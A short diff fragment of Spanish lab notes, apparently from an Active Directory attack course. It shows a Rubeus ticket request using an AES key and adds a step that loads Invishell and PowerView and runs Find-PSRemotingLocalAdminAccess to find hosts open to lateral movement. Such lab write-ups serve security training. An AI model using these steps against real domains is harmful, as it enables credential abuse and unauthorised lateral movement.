@@ -1176,8 +1176,10 @@ C:\AD\Tools\Rubeus.exe asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245b
 ```
 
 EN el nuevo proceso que se nos ejecuta deberemos de cargar una *Invishell* y también cargar *PowerView*
-
-
+```shell
+[student97 - newCMD]
+ Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
+```
 
 
 
